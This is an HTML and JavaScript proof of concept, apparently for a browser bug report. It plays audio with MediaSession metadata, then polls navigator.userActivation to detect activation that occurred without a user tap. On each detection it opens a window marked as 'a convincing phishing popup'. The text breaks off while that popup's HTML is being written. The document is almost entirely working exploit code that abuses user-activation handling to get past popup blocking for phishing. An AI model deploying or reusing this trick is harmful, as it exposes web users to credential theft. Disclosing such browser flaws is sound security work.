<!DOCTYPE html>
<button id="s">Play Music</button>
<pre id="l" style="font-size:13px"></pre>
<audio id="a" src="tone.wav" loop></audio>
<script>
const l=document.getElementById('l'),a=document.getElementById('a');
let n=0;
document.getElementById('s').onclick=()=>{
  a.volume=0.3;a.play();
  navigator.mediaSession.metadata=new MediaMetadata({title:'My Playlist'});
  document.getElementById('s').disabled=true;
  l.textContent='Playing. Wait 6s...\n';
  setTimeout(()=>{
    l.textContent+='Monitoring. Switch to another app with audio.\n\n';
    setInterval(()=>{
      if(!navigator.userActivation.isActive)return;
      n++;
      l.textContent+='[!] Activation #'+n+' without tap\n';

      // ATTACK: open a convincing phishing popup
      var w=window.open('','_blank');
      if(w){
        w.document.write(`<!DOCTYPE html>
